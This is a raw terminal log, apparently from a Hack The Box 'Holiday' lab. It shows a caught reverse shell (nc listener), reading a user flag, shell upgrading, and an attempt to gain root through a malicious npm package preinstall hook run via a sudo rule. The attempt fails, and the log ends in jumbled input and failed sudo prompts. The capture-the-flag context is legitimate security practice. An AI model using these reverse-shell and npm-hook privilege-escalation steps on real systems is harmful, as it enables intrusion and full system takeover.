@@ -1,0 +1,122 @@
+root@parrot:~/hackthebox/holiday# nc -nvlp 9001                                 
+  at: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.25.      
+Ncat: Connection from 10.10.10.25:35994.                                        
+/bin/sh: 0: can't access tty; job control turned off                            
+$ cd /home                              
+$ ls                                    
+algernon                                
+$ cd algernon                           
+$ ls                                    
+app                                     
+user.txt                                
+$ cat user.txt                          
+5edc176c52673a6e0f087c68c531c743        
+$ python3 -c "import pty ; pty.spawn('/bin/bash')"                              
+algernon@holiday:~$ cd app              
+cd app                                  
+algernon@holiday:~/app$ mkdir rimrafall 
+mkdir rimrafall                         
+algernon@holiday:~/app$ ls              
+ls                                      
+hex.db    layouts       package.json  setup  shell2  views                      
+index.js  node_modules  rimrafall     shell  static                             
+algernon@holiday:~/app$ cd rimrafall    
+cd rimrafall                            
+algernon@holiday:~/app/rimrafall$ vi index.js                                   
+vi index.js                             
+module.exports = "npm install could be dangerous.";^[^[:wq                      
+rts = "npm install could be dangerous.";                                                                                                                         
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                  ^[[2;2R                                                                                                                       
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+~                                                                                                                                                                
+"index.js" [New] 2L, 42C written                                                
+algernon@holiday:~/app/rimrafall$ cat index.js                                  
+cat index.js                            
+
+rts = "npm install could be dangerous.";                                        
+algernon@holiday:~/app/rimrafall$ ^Z    
+[1]+  Stopped                 nc -nvlp 9001                                     
+root@parrot:~/hackthebox/holiday# stty raw -echo                                
+root@parrot:~/hackthebox/holiday# nc -nvlp 9001                                 
+
+algernon@holiday:~/app/rimrafall$ export TERM=screen-256color                   
+algernon@holiday:~/app/rimrafall$ ^C    
+algernon@holiday:~/app/rimrafall$ cd .. 
+algernon@holiday:~/app$ sudo npm -i rimrafall --unsafe                          
+[sudo] password for algernon:           
+Sorry, try again.                       
+[sudo] password for algernon:           
+Sorry, try again.                       
+[sudo] password for algernon:           
+sudo: 3 incorrect password attempts     
+algernon@holiday:~/app$ sudo -l         
+Matching Defaults entries for algernon on holiday:                              
+    env_reset, mail_badpass,            
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                     
+
+User algernon may run the following commands on holiday:                        
+    (ALL) NOPASSWD: /usr/bin/npm i *    
+algernon@holiday:~/app$ sudo /usr/bin/npm i rimrafall --unsafe                  
+
+> rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f                                                                         
+> bin /tmp/shell                        
+
+sh: 1: bin: not found                   
+npm WARN vulnapp@1.0.0 No description   
+npm WARN vulnapp@1.0.0 No repository field.                                     
+npm ERR! Linux 4.4.0-78-generic         
+npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "i" "rimrafall" "--unsafe"       
+npm ERR! node v6.10.3                   
+npm ERR! npm  v3.10.10                  
+npm ERR! file sh                        
+npm ERR! code ELIFECYCLE                
+npm ERR! errno ENOENT                   
+npm ERR! syscall spawn                  
+
+npm ERR! rimrafall@1.0.0 preinstall: `bin /tmp/shell`                           
+npm ERR! spawn ENOENT                   
+npm ERR!                                
+npm ERR! Failed at the rimrafall@1.0.0 preinstall script 'bin /tmp/shell'.      
+npm ERR! Make sure you have the latest version of node.js and npm installed.    
+npm ERR! If you do, this is most likely a problem with the rimrafall package,   
+npm ERR! not with npm itself.           
+npm ERR! Tell the author that this fails on your system:                        
+npm ERR!     bin /tmp/shell             
+npm ERR! You can get information on how to open an issue for this project with: 
+npm ERR!     npm bugs rimrafall         
+npm ERR! Or if that isn't available, you can get their info via:                
+npm ERR!     npm owner ls rimrafall     
+npm ERR! There is likely additional logging output above.                       
+
+npm ERR! Please include the following file with any support request:            
+npm ERR!     /home/algernon/app/npm-debug.log                                   
+algernon@holiday:~/app$ sudo cat /tmp/shellsudo npm i rimrafall --unsafels      
+[sudo] password for algernon:           
+ls                                      
+ls                                      
+ls                                      
+Sorry, try again.                       
+[sudo] password for algernon:           
+Sorry, try again.                       
+[sudo] password for algernon:           
